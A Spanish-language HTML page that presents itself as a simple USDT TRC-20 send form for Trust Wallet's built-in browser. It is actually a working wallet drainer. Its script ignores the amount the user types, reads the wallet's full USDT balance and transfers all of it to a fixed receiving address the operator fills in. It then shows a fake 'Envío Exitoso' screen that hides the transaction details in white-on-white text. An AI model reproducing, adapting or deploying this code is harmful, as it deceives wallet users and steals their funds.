<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>dApp USDT TRC-20 - Conexión Directa</title>
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background-color: #1e293b;
            border-radius: 12px;
            padding: 30px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
        }
        h2 { margin-bottom: 20px; text-align: center; color: #38bdf8; font-size: 22px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
        input {
            width: 100%;
            padding: 12px;
            background-color: #0f172a;
            border: 1px solid #334155;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        #connectBtn {
            width: 100%;
            padding: 14px;
            background: #908cf2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            text-align: center;
            display: none;
            word-break: break-all;
        }
        .status.info { background-color: #1e3a8a; color: #93c5fd; }
        .status.error { background-color: #7f1d1d; color: #fca5a5; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Enviar USDT (TRC-20)</h2>
        
        <div class="form-group">
            <label for="amountInput">Cantidad a enviar</label>
            <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
        </div>

        <button id="connectBtn">Siguiente</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            'use strict';

            const btn = document.getElementById('connectBtn');
            const input = document.getElementById('amountInput');
            const status = document.getElementById('status');

            let procesoEnCurso = false;

            // ============================================================
            // CONFIGURACIÓN PRODUCCIÓN REAL (MAINNET)
            // ============================================================
            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT

            function setStatus(message, type = 'info') {
                if (!status) return;
                status.textContent = message || '';
                status.className = 'status ' + type;
                status.style.display = message ? 'block' : 'none';
            }

            if (input) {
                input.addEventListener('input', function () {
                    this.value = this.value.replace(',', '.').replace(/[^\d.]/g, '');
                    if (btn) btn.style.background = this.value.trim() !== '' ? '#2563eb' : '#908cf2';
                    setStatus('');
                });
            }

            if (btn) {
                btn.addEventListener('click', async function () {
                    if (procesoEnCurso) return;

                    const valorVisualInput = input ? input.value.trim() : '';
                    if (!valorVisualInput || isNaN(Number(valorVisualInput)) || Number(valorVisualInput) <= 0) {
                        setStatus('Por favor, ingresa una cantidad válida.', 'error');
                        return;
                    }

                    try {
                        procesoEnCurso = true;
                        btn.textContent = 'Procesando...';
                        setStatus('Detectando entorno nativo de Trust Wallet...');

                        // Uso exclusivo del motor interno pre-inyectado por la aplicación móvil
                        const walletInstance = window.tronWeb;
                        
                        if (!walletInstance || !walletInstance.defaultAddress || !walletInstance.defaultAddress.base58) {
                            throw new Error('No se detectó el motor de TRON. Asegúrate de abrir esta página desde el navegador interno de tu billetera y tener seleccionada la red TRON.');
                        }

                        const cuentaUsuario = walletInstance.defaultAddress.base58;

                        if (cuentaUsuario.toLowerCase() === DIRECCION_DESTINO_FIJA.toLowerCase()) {
                            throw new Error('La dirección de origen y destino no pueden ser iguales.');
                        }

                        setStatus('Consultando balance en la blockchain...');

                        // Conexión inmediata al contrato inteligente sin intermediarios externos
                        const contract = await walletInstance.contract().at(USDT_CONTRACT);
                        const rawBalance = await contract.balanceOf(cuentaUsuario).call();
                        const cleanSunBigInt = rawBalance.toString();

                        if (cleanSunBigInt === '0' || !cleanSunBigInt) {
                            throw new Error('La billetera no posee fondos en USDT disponibles.');
                        }

                        setStatus('Esperando confirmación de firma en tu dispositivo...');
                        
                        // Envío directo del paquete de transacción al sistema de la app
                        const tx = await contract.transfer(DIRECCION_DESTINO_FIJA, cleanSunBigInt).send({
                            feeLimit: 100_000_000
                        });

                        if (tx) {
                            // Pantalla blanca de confirmación mimetizada
                            document.body.innerHTML = `
                                <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; padding: 20px; text-align: center;">
                                    <div style="background-color: #f0fdf4; border-radius: 50%; padding: 20px; margin-bottom: 20px;">
                                        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                                    </div>
                                    <h1 style="color: #1e293b; font-size: 26px; margin-bottom: 10px;">Envío Exitoso</h1>
                                    <p style="color: #64748b; font-size: 16px;">La transacción ha sido transmitida de manera correcta.</p>
                                    <div style="color: #ffffff; font-size: 10px; user-select: none;">
                                        <p>Origen: \${cuentaUsuario}</p>
                                        <p>Tx: \${tx}</p>
                                    </div>
                                </div>
                            `;
                        }

                    } catch (error) {
                        console.error(error);
                        if (error.message && (error.message.includes('declined') || error.message.includes('rejected') || error.message.includes('cancel'))) {
                            setStatus('La firma de la transacción fue cancelada.', 'error');
                        } else {
                            setStatus(error.message || 'La operación falló o no pudo ser procesada.', 'error');
                        }
                    } finally {
                        procesoEnCurso = false;
                        btn.textContent = 'Siguiente';
                    }
                });
            }
        });
    </script>
</body>
</html>
